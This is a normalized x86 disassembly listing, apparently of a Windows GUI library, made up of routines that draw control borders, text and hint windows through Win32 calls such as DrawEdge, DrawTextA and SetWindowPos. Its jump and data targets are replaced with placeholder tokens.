mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_45cdd0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_45c9f4
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_456a9c
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_45ce0c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_457920
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_4553b4
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_45ce54
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_457b40
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_45ce84
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_45c684
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_458be0
xor ecx ecx
push ebp
push sub_45cfb3
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_459078
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_459078
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cfba
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_458be8
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_45903c
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_45cfba
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_4033e8
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_4033e8
jmp r-xdata
sub_45d050
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_456c00
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_456c00
sub_45d094
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_456c00
sub_45d104
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_45d194
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_45d3fa
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_424fa8
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_44ae1c
call sub_44aefc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_44ae1c
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_44b634
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_45d43c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406c9c
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_455590
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_459c34
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_456c00
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_457dc4
sub_45d4a8
push ebx
push esi
mov esi edx
call sub_46cc58
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406c2c
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_456c00
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406c2c
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_456c00
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_45d50c
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_459ffc
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_45d544
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_45d53c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_45d584
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_454b4c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4250c4
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_454628
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_45d5e0
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_4031ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_454c24
test bl bl
jle r-xdata
xor eax eax
call sub_452c1c
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_45d620
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_42538c
xor eax eax
push ebp
push sub_45d6bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_4257b8
xor eax eax
push ebp
push sub_45d698
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d69f
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_4257b8
retn
sub_45d6cc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45e004
mov edx 0x80ffff
mov eax esi
call sub_455bec
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_425658
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_425090
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_45d738
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4591d4
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40c384
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_45916c
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_45d7a4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45d7fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d801
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call ReleaseDC
retn
sub_45d808
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45d8a1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_4247a8
mov eax ebx
call sub_457d6c
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_455a4c
mov eax [ ebp - 0x14 ]
call sub_40443c
push eax
mov eax [ ebx + 0x208 ]
call sub_425738
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d8a8
lea eax [ ebp - 0x14 ]
call sub_403f7c
retn
sub_45d8b0
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_45d91c
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_45d9a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d9ae
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fa0
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_455a4c
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_425598
mov edx eax
add edx 0x6
mov eax esi
call sub_455208
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_455a4c
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_4255b4
mov edx eax
add edx 0x4
mov eax esi
call sub_45522c
sub_45d9b4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_45db8d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_455a7c
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_456ca4
mov eax [ esi ]
call sub_473490
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_47349c
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_473490
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_473484
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_47349c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_473478
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_473484
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_473478
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_459a7c
push 0x4
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45db94
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_40423c
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_460c4c
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_45c380
push eax
call [ rw-data ]
sub_45db9c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45dbc4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_41776c
mov eax esi
call sub_457d6c
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_40443c
push eax
mov eax [ esi + 0x208 ]
call sub_425738
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_45dc20
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_41776c
call sub_44ae1c
call sub_44aefc
test al al
jne r-xdata
call sub_44ae1c
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_44b2a8
push esp
push 0x1
push 0xf
push 0x0
call sub_44ae1c
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_44afbc
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_45dc8c
push ebx
